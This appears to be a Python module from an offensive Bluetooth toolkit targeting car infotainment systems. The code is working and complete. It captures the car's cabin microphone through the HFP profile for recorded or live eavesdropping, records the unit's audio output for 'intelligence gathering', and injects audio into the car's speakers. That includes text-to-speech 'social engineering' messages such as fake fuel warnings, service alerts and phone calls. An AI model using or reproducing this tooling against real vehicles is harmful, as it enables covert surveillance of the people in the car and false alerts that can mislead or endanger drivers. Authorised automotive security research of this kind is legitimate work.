"""Audio capture and injection via PulseAudio/PipeWire.

Handles both HFP (call audio/mic) and A2DP (media audio) profiles.
Uses pactl/parecord/paplay which are the proven-working tools for
Bluetooth audio on Linux (pw-record often fails with BT devices).

Key learnings from real-world IVI attacks:
  - Must set correct card profile: headset-head-unit (HFP) or a2dp-sink (A2DP)
  - Must unmute the BT source and set volume to 100%
  - Must mute laptop mic to avoid interference
  - HFP mic format: 16000 Hz, mono, S16LE
  - A2DP media format: 44100 Hz, stereo, S16LE
  - Device names: bluez_input.<MAC_underscored>.0  (mic/source)
                  bluez_output.<MAC_underscored>.1 (speaker/sink)
  - parecord is more reliable than pw-record for BT audio
"""

import os
import subprocess
import time
import re
import wave
import datetime

from bt_tap.utils.bt_helpers import run_cmd, check_tool
from bt_tap.utils.output import info, success, error, warning, console


def mac_to_pa_id(mac: str) -> str:
    """Convert MAC address to PulseAudio/PipeWire device ID format.

    AA:BB:CC:DD:EE:FF -> AA_BB_CC_DD_EE_FF
    """
    return mac.replace(":", "_")


def bt_source_name(mac: str) -> str:
    """Get the bluez HFP/HSP microphone input device name for a MAC."""
    return f"bluez_input.{mac_to_pa_id(mac)}.0"


def bt_a2dp_source_name(mac: str) -> str:
    """Get the bluez A2DP media source device name for a MAC.

    A2DP audio from a remote device (e.g., IVI playing music to us)
    appears as bluez_source, not bluez_input (which is HFP mic).
    """
    return f"bluez_source.{mac_to_pa_id(mac)}.a2dp_sink"


def bt_sink_name(mac: str) -> str:
    """Get the bluez output (speaker/sink) device name for a MAC."""
    return f"bluez_output.{mac_to_pa_id(mac)}.1"


def bt_card_name(mac: str) -> str:
    """Get the bluez card name for a MAC."""
    return f"bluez_card.{mac_to_pa_id(mac)}"


# ============================================================================
# Profile Management
# ============================================================================

def set_profile_hfp(mac: str) -> bool:
    """Set Bluetooth card to HFP mode (headset-head-unit).

    HFP mode enables the car's microphone for recording.
    """
    card = bt_card_name(mac)
    info(f"Setting {card} to HFP (headset-head-unit) profile...")
    result = run_cmd(["pactl", "set-card-profile", card, "headset-head-unit"])
    if result.returncode == 0:
        success("Profile set to HFP (headset-head-unit)")
        return True
    error(f"Failed to set HFP profile: {result.stderr.strip()}")
    return False


def set_profile_a2dp(mac: str) -> bool:
    """Set Bluetooth card to A2DP sink mode (media audio).

    A2DP mode enables high-quality media audio playback to car speakers.
    """
    card = bt_card_name(mac)
    info(f"Setting {card} to A2DP (a2dp-sink) profile...")
    result = run_cmd(["pactl", "set-card-profile", card, "a2dp-sink"])
    if result.returncode == 0:
        success("Profile set to A2DP (a2dp-sink)")
        return True
    error(f"Failed to set A2DP profile: {result.stderr.strip()}")
    return False


def get_active_profile(mac: str) -> str:
    """Get the currently active Bluetooth profile for a device."""
    card = bt_card_name(mac)
    result = run_cmd(["pactl", "list", "cards"])
    if result.returncode != 0:
        return "unknown"
    # Find the card section and look for active profile
    in_card = False
    for line in result.stdout.splitlines():
        if card in line:
            in_card = True
        elif in_card and "Active Profile:" in line:
            return line.split(":", 1)[1].strip()
        elif in_card and line.strip() == "":
            in_card = False
    return "unknown"


# ============================================================================
# Microphone Management
# ============================================================================

def unmute_source(source: str) -> bool:
    """Unmute an audio source and set volume to 100%."""
    r1 = run_cmd(["pactl", "set-source-mute", source, "0"])
    r2 = run_cmd(["pactl", "set-source-volume", source, "100%"])
    if r1.returncode != 0 or r2.returncode != 0:
        warning(f"Unmute may have failed: {r1.stderr.strip()} {r2.stderr.strip()}")
        return False
    success(f"Unmuted and set 100% volume: {source}")
    return True


def mute_source(source: str) -> bool:
    """Mute an audio source."""
    r = run_cmd(["pactl", "set-source-mute", source, "1"])
    if r.returncode != 0:
        warning(f"Mute may have failed: {r.stderr.strip()}")
        return False
    info(f"Muted: {source}")
    return True


def mute_laptop_mic() -> bool:
    """Mute the laptop's built-in microphone to prevent interference.

    This is critical when recording from the car's mic - both mics active
    simultaneously causes audio issues.
    """
    result = run_cmd(["pactl", "list", "sources", "short"])
    if result.returncode != 0:
        return False
    for line in result.stdout.splitlines():
        parts = line.split("\t")
        if len(parts) > 1:
            name = parts[1]
            # Mute ALSA/built-in sources, not bluez
            if "alsa_input" in name or "analog" in name:
                mute_source(name)
                info(f"Muted laptop mic: {name}")
    return True


def unmute_laptop_mic() -> bool:
    """Re-enable the laptop's microphone after recording."""
    result = run_cmd(["pactl", "list", "sources", "short"])
    if result.returncode != 0:
        return False
    for line in result.stdout.splitlines():
        parts = line.split("\t")
        if len(parts) > 1:
            name = parts[1]
            if "alsa_input" in name or "analog" in name:
                unmute_source(name)
    return True


def set_sink_volume(sink: str, volume_pct: int = 80) -> bool:
    """Set sink (speaker) volume. Must be in % format."""
    result = run_cmd(["pactl", "set-sink-volume", sink, f"{volume_pct}%"])
    if result.returncode == 0:
        info(f"Volume set to {volume_pct}%: {sink}")
        return True
    return False


# ============================================================================
# Device Enumeration
# ============================================================================

def list_bt_audio_sources() -> list[dict]:
    """List Bluetooth audio sources (microphones) in PulseAudio/PipeWire."""
    sources = []
    result = run_cmd(["pactl", "list", "sources", "short"])
    if result.returncode == 0:
        for line in result.stdout.splitlines():
            if "bluez" in line.lower():
                parts = line.split("\t")
                sources.append({
                    "id": parts[0] if len(parts) > 0 else "",
                    "name": parts[1] if len(parts) > 1 else "",
                    "driver": parts[2] if len(parts) > 2 else "",
                    "state": parts[4].strip() if len(parts) > 4 else "",
                })
    return sources


def list_bt_audio_sinks() -> list[dict]:
    """List Bluetooth audio sinks (speakers)."""
    sinks = []
    result = run_cmd(["pactl", "list", "sinks", "short"])
    if result.returncode == 0:
        for line in result.stdout.splitlines():
            if "bluez" in line.lower():
                parts = line.split("\t")
                sinks.append({
                    "id": parts[0] if len(parts) > 0 else "",
                    "name": parts[1] if len(parts) > 1 else "",
                    "driver": parts[2] if len(parts) > 2 else "",
                })
    return sinks


def detect_mic_channels(mac: str) -> int:
    """Detect whether the car's mic supports mono (1) or stereo (2)."""
    source = bt_source_name(mac)
    result = run_cmd(["pactl", "list", "sources"])
    if result.returncode != 0:
        return 1  # Default mono for HFP
    in_source = False
    for line in result.stdout.splitlines():
        if source in line:
            in_source = True
        elif in_source and "channel" in line.lower():
            m = re.search(r"(\d+)", line)
            if m:
                channels = int(m.group(1))
                info(f"Detected {channels} channel(s) on {source}")
                return channels
    return 1


# ============================================================================
# Recording (Car Microphone Eavesdrop)
# ============================================================================

def record_car_mic(mac: str, output_file: str = "car_mic.wav",
                    duration: int = 60, auto_setup: bool = True) -> str:
    """Record audio from the car's Bluetooth microphone.

    This is the primary eavesdropping function. It:
    1. Switches to HFP profile (headset-head-unit)
    2. Mutes the laptop mic to prevent interference
    3. Unmutes the BT source and sets volume to 100%
    4. Records using parecord (proven reliable for BT audio)
    5. Restores laptop mic when done

    Args:
        mac: Car/IVI Bluetooth MAC address
        output_file: Output WAV file path
        duration: Recording duration in seconds (0 = until Ctrl+C)
        auto_setup: Automatically configure profiles and mics
    """
    source = bt_source_name(mac)

    if auto_setup:
        # Step 1: Set HFP profile for mic access
        set_profile_hfp(mac)
        time.sleep(1)

        # Step 2: Mute laptop mic
        mute_laptop_mic()

        # Step 3: Unmute car mic and set volume
        unmute_source(source)

    # Step 4: Detect format
    channels = detect_mic_channels(mac)
    rate = 16000 if channels == 1 else 44100

    info(f"Recording from {source} ({rate}Hz, {channels}ch) -> {output_file}")
    info(f"Duration: {duration}s (Ctrl+C to stop early)")

    if not check_tool("parecord"):
        error("parecord not found. Install: apt install pulseaudio-utils")
        return ""

    # Use parecord (proven more reliable than pw-record for BT)
    cmd = [
        "parecord",
        f"--device={source}",
        f"--rate={rate}",
        f"--channels={channels}",
        "--format=s16le",
        "--file-format=wav",
        output_file,
    ]

    proc = None
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        info(f"Recording started (PID: {proc.pid})")
        if duration > 0:
            time.sleep(duration)
            proc.terminate()
            proc.wait(timeout=5)
        else:
            # Record until interrupted
            proc.wait()
    except KeyboardInterrupt:
        if proc:
            proc.terminate()
            proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        if proc:
            proc.kill()
    except Exception as e:
        error(f"Recording failed: {e}")
        if auto_setup:
            unmute_laptop_mic()
        return ""

    if auto_setup:
        unmute_laptop_mic()

    if os.path.exists(output_file):
        size = os.path.getsize(output_file)
        success(f"Recorded {size} bytes -> {output_file}")
        if size < 1000:
            warning("File is very small - check mic volume and mute status")
    else:
        error("Output file not created")

    return output_file


def live_eavesdrop(mac: str, auto_setup: bool = True):
    """Stream car's microphone live to laptop speakers.

    Real-time eavesdropping: parecord | aplay
    Press Ctrl+C to stop.
    """
    source = bt_source_name(mac)

    if auto_setup:
        set_profile_hfp(mac)
        time.sleep(1)
        mute_laptop_mic()
        unmute_source(source)

    channels = detect_mic_channels(mac)
    rate = 16000 if channels == 1 else 44100

    info(f"Live eavesdrop from {source} -> laptop speakers")
    info("Press Ctrl+C to stop")

    record = None
    play = None
    try:
        record = subprocess.Popen(
            ["parecord", f"--device={source}", f"--rate={rate}",
             f"--channels={channels}", "--format=s16le"],
            stdout=subprocess.PIPE,
        )
        play = subprocess.Popen(
            ["aplay", "-r", str(rate), "-c", str(channels), "-f", "S16_LE"],
            stdin=record.stdout,
        )
        play.wait()
    except KeyboardInterrupt:
        pass
    finally:
        if record:
            try:
                record.terminate()
            except Exception:
                pass
        if play:
            try:
                play.terminate()
            except Exception:
                pass
        if auto_setup:
            unmute_laptop_mic()
        info("Live eavesdrop stopped")


# ============================================================================
# Audio Injection (Play to Car Speakers)
# ============================================================================

def play_to_car(mac: str, audio_file: str, volume_pct: int = 80) -> bool:
    """Play an audio file through the car's speakers via A2DP.

    Args:
        mac: Car/IVI Bluetooth MAC address
        audio_file: Path to audio file (WAV recommended)
        volume_pct: Volume level in % (must be %, not raw value)
    """
    if not os.path.exists(audio_file):
        error(f"File not found: {audio_file}")
        return False

    sink = bt_sink_name(mac)

    # Set A2DP profile for media playback
    set_profile_a2dp(mac)
    time.sleep(1)

    # Set volume
    set_sink_volume(sink, volume_pct)

    info(f"Playing {audio_file} -> {sink}")
    result = subprocess.run(
        ["paplay", f"--device={sink}", audio_file],
        timeout=600,
        capture_output=True,
    )

    if result.returncode == 0:
        success("Playback complete")
        return True
    error(f"Playback failed (rc={result.returncode})")
    return False


def stream_mic_to_car(mac: str, mic_source: str | None = None) -> bool:
    """Route laptop microphone to car speakers via module-loopback.

    This lets you speak through the car's speakers in real-time.
    """
    sink = bt_sink_name(mac)

    # Auto-detect laptop mic if not specified
    if mic_source is None:
        result = run_cmd(["pactl", "list", "sources", "short"])
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                parts = line.split("\t")
                if len(parts) > 1 and ("alsa_input" in parts[1] or "analog" in parts[1]):
                    mic_source = parts[1]
                    break
    if not mic_source:
        error("No laptop microphone found")
        return False

    set_profile_a2dp(mac)
    time.sleep(1)

    info(f"Routing {mic_source} -> {sink}")
    info("Use 'bt-tap a2dp loopback-stop' to disconnect")
    result = run_cmd([
        "pactl", "load-module", "module-loopback",
        f"source={mic_source}", f"sink={sink}",
    ])
    if result.returncode == 0:
        success(f"Loopback active (module id: {result.stdout.strip()})")
        return True
    error(f"Loopback failed: {result.stderr.strip()}")
    return False


def stop_loopback() -> bool:
    """Stop all module-loopback instances.

    Lists loaded modules to find loopback indices, then unloads each by
    index. This works on both PulseAudio and PipeWire (unload-by-name
    only works on PulseAudio).
    """
    # First try by name (works on PulseAudio)
    result = run_cmd(["pactl", "unload-module", "module-loopback"])
    if result.returncode == 0:
        success("All loopback modules unloaded")
        return True

    # Fallback: find loopback module indices and unload each
    list_result = run_cmd(["pactl", "list", "modules", "short"])
    if list_result.returncode != 0:
        warning(f"Cannot list modules: {list_result.stderr.strip()}")
        return False

    unloaded = 0
    for line in list_result.stdout.splitlines():
        if "module-loopback" in line:
            parts = line.split("\t")
            if parts:
                idx = parts[0].strip()
                r = run_cmd(["pactl", "unload-module", idx])
                if r.returncode == 0:
                    unloaded += 1

    if unloaded > 0:
        success(f"Unloaded {unloaded} loopback module(s)")
        return True
    warning("No loopback modules found to unload")
    return False


# ============================================================================
# A2DP Capture (Media Stream from IVI)
# ============================================================================

def inject_tts(mac: str, text: str, lang: str = "en",
               output_file: str = "/tmp/bt_tap_tts.wav") -> bool:
    """Generate text-to-speech audio and play through car speakers.

    Social engineering attack: inject convincing audio messages like
    "Low fuel warning", "Service required", fake phone calls, or
    navigation prompts through the car's speakers.

    Requires: espeak-ng or pico2wave (apt install espeak-ng)

    Args:
        mac: Car/IVI Bluetooth MAC address
        text: Text to synthesize and play
        lang: Language code (en, de, fr, es, etc.)
        output_file: Temp WAV file for synthesized audio
    """
    info(f"Generating TTS: '{text[:50]}...' -> car speakers")

    # Try espeak-ng first (most common on Kali)
    if check_tool("espeak-ng"):
        result = run_cmd([
            "espeak-ng", "-v", lang, "-w", output_file, text
        ], timeout=30)
        if result.returncode != 0:
            error(f"espeak-ng failed: {result.stderr.strip()}")
            return False
    elif check_tool("pico2wave"):
        result = run_cmd([
            "pico2wave", f"--lang={lang}", f"--wave={output_file}", text
        ], timeout=30)
        if result.returncode != 0:
            error(f"pico2wave failed: {result.stderr.strip()}")
            return False
    else:
        error("No TTS engine found. Install: apt install espeak-ng")
        return False

    success(f"TTS generated: {output_file}")
    return play_to_car(mac, output_file)


def record_navigation_audio(mac: str, output_file: str = "nav_audio.wav",
                             duration: int = 300) -> str:
    """Record navigation/alert audio from the IVI.

    Captures what the IVI is playing — navigation prompts, system alerts,
    media audio. Useful for understanding the IVI's audio routing and
    for intelligence gathering.

    Args:
        mac: Car/IVI Bluetooth MAC address
        output_file: Output WAV file
        duration: Recording duration (default 5 minutes)
    """
    info(f"Recording IVI audio output for {duration}s...")

    # Use A2DP source (IVI -> us) not HFP mic
    set_profile_a2dp(mac)
    time.sleep(1)

    source = bt_a2dp_source_name(mac)
    unmute_source(source)

    if not check_tool("parecord"):
        error("parecord not found. Install: apt install pulseaudio-utils")
        return ""

    cmd = [
        "parecord",
        f"--device={source}",
        "--rate=44100",
        "--channels=2",
        "--format=s16le",
        "--file-format=wav",
        output_file,
    ]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        info(f"Recording IVI audio (PID: {proc.pid})")
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    except Exception as e:
        error(f"Recording failed: {e}")
        return ""

    if os.path.exists(output_file):
        size = os.path.getsize(output_file)
        success(f"Captured IVI audio: {output_file} ({size} bytes)")
        return output_file
    return ""


def capture_a2dp(mac: str | None = None, output_file: str = "a2dp_capture.wav",
                  duration: int = 60, source: str | None = None) -> str:
    """Capture A2DP audio stream to WAV file.

    If mac is provided, constructs the device name automatically.
    Otherwise falls back to auto-detection.
    """
    # Ensure A2DP profile is active for media audio capture
    if mac:
        set_profile_a2dp(mac)
        time.sleep(1)

    if source is None and mac:
        source = bt_a2dp_source_name(mac)
    elif source is None:
        sources = list_bt_audio_sources()
        if sources:
            source = sources[0]["name"]
            info(f"Auto-detected BT source: {source}")
        else:
            warning("No Bluetooth audio source detected.")
            result = run_cmd(["pactl", "list", "sources", "short"])
            if result.returncode == 0:
                info(f"Available sources:\n{result.stdout}")
            return ""

    info(f"Capturing A2DP for {duration}s: {source} -> {output_file}")

    cmd = [
        "parecord",
        f"--device={source}",
        "--rate=44100",
        "--channels=2",
        "--format=s16le",
        "--file-format=wav",
        output_file,
    ]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        info(f"Recording started (PID: {proc.pid})")
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
        success(f"Captured A2DP audio -> {output_file}")
        return output_file
    except subprocess.TimeoutExpired:
        proc.kill()
        return output_file
    except Exception as e:
        error(f"A2DP capture failed: {e}")
        return ""


# ============================================================================
# Troubleshooting
# ============================================================================

def restart_audio_services():
    """Restart PipeWire and PulseAudio to fix audio routing issues."""
    info("Restarting audio services...")
    run_cmd(["systemctl", "--user", "restart", "pipewire", "pipewire-pulse"])
    time.sleep(2)
    success("Audio services restarted")


def diagnose_bt_audio(mac: str):
    """Print diagnostic info for Bluetooth audio troubleshooting."""
    from rich.panel import Panel

    console.rule("[bold]Bluetooth Audio Diagnostics")

    # Card info
    card = bt_card_name(mac)
    result = run_cmd(["pactl", "list", "cards"])
    if result.returncode == 0:
        in_card = False
        card_lines = []
        for line in result.stdout.splitlines():
            if card in line:
                in_card = True
            if in_card:
                card_lines.append(line)
                if len(card_lines) > 25:
                    break
        if card_lines:
            console.print(Panel("\n".join(card_lines), title="Card Info"))
        else:
            error(f"Card {card} not found in pactl output")

    # Sources
    source = bt_source_name(mac)
    console.print(f"\n[bold]Expected source:[/bold] {source}")
    result = run_cmd(["pactl", "list", "sources", "short"])
    if result.returncode == 0:
        found = False
        for line in result.stdout.splitlines():
            if "bluez" in line:
                console.print(f"  {line}")
                found = True
        if not found:
            warning("No bluez sources found")

    # Sinks
    sink = bt_sink_name(mac)
    console.print(f"\n[bold]Expected sink:[/bold] {sink}")
    result = run_cmd(["pactl", "list", "sinks", "short"])
    if result.returncode == 0:
        for line in result.stdout.splitlines():
            if "bluez" in line:
                console.print(f"  {line}")

    # Mute status
    console.print(f"\n[bold]Source mute status:[/bold]")
    result = run_cmd(["pactl", "get-source-mute", source])
    console.print(f"  {result.stdout.strip()}" if result.returncode == 0 else "  (unavailable)")

    # Active profile
    profile = get_active_profile(mac)
    console.print(f"\n[bold]Active profile:[/bold] {profile}")
    if "a2dp" in profile:
        info("Profile is A2DP - switch to headset-head-unit for mic access")
    elif "headset" in profile:
        info("Profile is HFP - mic should be accessible")


# ============================================================================
# Audio File Review and Playback
# ============================================================================

def list_captures(directory: str = ".") -> list[dict]:
    """Recursively find all .wav files in directory with metadata.

    Returns list of dicts sorted by modified time (newest first), each with:
        filename: relative path from directory
        duration_secs: float duration in seconds
        size_bytes: file size in bytes
        modified: ISO format timestamp string
    """
    captures = []
    for root, _dirs, files in os.walk(directory):
        for fname in files:
            if not fname.lower().endswith(".wav"):
                continue
            fullpath = os.path.join(root, fname)
            relpath = os.path.relpath(fullpath, directory)
            try:
                stat = os.stat(fullpath)
                size = stat.st_size
                mtime = stat.st_mtime
                modified = datetime.datetime.fromtimestamp(mtime).isoformat()
            except OSError:
                continue

            duration = 0.0
            try:
                with wave.open(fullpath, "rb") as wf:
                    frames = wf.getnframes()
                    framerate = wf.getframerate()
                    if framerate > 0:
                        duration = frames / framerate
            except Exception:
                pass

            captures.append({
                "filename": relpath,
                "duration_secs": round(duration, 2),
                "size_bytes": size,
                "modified": modified,
            })

    captures.sort(key=lambda c: c["modified"], reverse=True)
    return captures


def play_capture(filepath: str) -> bool:
    """Play a WAV file locally using aplay (preferred) or paplay fallback.

    Returns True on successful playback, False otherwise.
    """
    if not os.path.exists(filepath):
        error(f"File not found: {filepath}")
        return False

    for player in ("aplay", "paplay"):
        try:
            result = subprocess.run(
                [player, filepath],
                timeout=600,
                capture_output=True,
            )
            if result.returncode == 0:
                success(f"Played {filepath} via {player}")
                return True
        except FileNotFoundError:
            continue
        except subprocess.TimeoutExpired:
            warning(f"Playback timed out with {player}")
            continue
        except Exception as e:
            warning(f"{player} failed: {e}")
            continue

    error("No working audio player found (tried aplay, paplay)")
    return False


def interactive_review(directory: str = "."):
    """Interactively list, select, and play captured WAV files.

    Displays a numbered table of captures and prompts for selection.
    Type 'q' or 'quit' to exit. Ctrl+C also exits cleanly.
    """
    from rich.table import Table

    while True:
        captures = list_captures(directory)
        if not captures:
            warning(f"No .wav files found in {directory}")
            return

        table = Table(title="Captured Audio Files")
        table.add_column("#", style="bold cyan", justify="right")
        table.add_column("Filename", style="green")
        table.add_column("Duration", justify="right")
        table.add_column("Size", justify="right")
        table.add_column("Modified")

        for i, cap in enumerate(captures):
            mins, secs = divmod(int(cap["duration_secs"]), 60)
            dur_str = f"{mins}:{secs:02d}"
            size_kb = cap["size_bytes"] / 1024
            size_str = f"{size_kb:.1f} KB" if size_kb < 1024 else f"{size_kb / 1024:.1f} MB"
            table.add_row(str(i), cap["filename"], dur_str, size_str, cap["modified"])

        console.print(table)

        try:
            choice = input("\nSelect file number to play (q to quit): ").strip()
        except (KeyboardInterrupt, EOFError):
            info("\nReview ended.")
            return

        if choice.lower() in ("q", "quit"):
            info("Review ended.")
            return

        try:
            idx = int(choice)
            if 0 <= idx < len(captures):
                filepath = os.path.join(directory, captures[idx]["filename"])
                play_capture(filepath)
            else:
                warning(f"Invalid selection: {idx}")
        except ValueError:
            warning(f"Invalid input: {choice}")
